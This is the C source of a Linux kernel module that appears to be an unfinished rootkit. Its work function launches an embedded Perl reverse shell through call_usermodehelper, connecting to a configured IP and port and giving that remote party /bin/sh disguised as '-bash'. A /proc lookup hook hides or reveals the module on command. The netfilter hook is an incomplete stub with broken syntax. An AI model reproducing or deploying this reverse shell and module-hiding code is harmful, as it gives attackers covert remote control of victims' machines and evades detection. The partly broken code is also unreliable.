#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/types.h>
#include "util.h"
#include "module.h"
#include "hidemod.h"

unsigned int remote_shell_hook (unsigned int hooknum, struct sk_buff **skb,
	const struct net_device *in, const struct net_device *out, int (*okfn) (struct sk_buff *))
{
	struct sk_buff *sb = *skb;

    // Source address
	__be32 host_addr = ntohl(SKB_NH(sb)->saddr);

    if(sb->protocol ==  ETH_P_IP || sb->protocol == ETH_P_IPV6)
    {
        // Retrieve an IP header.
        struct *iph = ip_hdr(sb);

        sb->data;



    

        // return NF_STOLEN
    }


    return NF_ACCEPT;
}

/* Remote shell launcher work function */

/* work queue function */
void work(void *wdata)
{
    char *env[] = {NULL};
    int i=0,j=0;
    
    
    /* isto e' a remote shell em perl */

    char *args[] = {"/usr/bin/perl", "-e",
        "use Socket;use POSIX; setgid(00000);"
            "(socket(SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp')) && connect(SERVER, pack 'SnA4x8', 2, $ARGV[1], inet_aton($ARGV[0]))) || exit();"
            "open(STDIN,'>&SERVER'); open(STDOUT,'>&SERVER'); open(STDERR,'>&SERVER');"
            "exec {'/bin/sh'} '-bash' .\"\" ",
        "mega", od->cpstring, NULL};

    args[0] = od->perlpath;
    args[3] = od->ipstring;
    args[4] = od->cpstring;

    /* decalc gid inside perl */
    for(i=0;args[2][i]!='(';i++); i++;
    for(j=0;j<5;j++)
        args[2][i+j]=od->gid[j];

    if(debug)
        printk("tunnel started with gid %s, connecting to=%s:%s with %s", od->gid, args[3], args[4], args[0]);

    call_usermodehelper(perlpath, args, env, 0);
}


int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u)
{	
	return 0;
}

struct dentry * new_proc_lookup(struct inode *i, struct dentry *d, struct nameidata *nd)
{
	if(!strcmp(d->d_name.name, "unhide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		show_module();
		return NULL;
	} else if( !strcmp(d->d_name.name, "hide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		hide_module();
		return NULL;
	} else
		return proc_original_inode_operations.lookup(i, d, nd);
}

int new_proc_readdir(struct file *a, void *b, filldir_t c)
{
	return proc_original_file_operations.readdir(a, b, c);
}
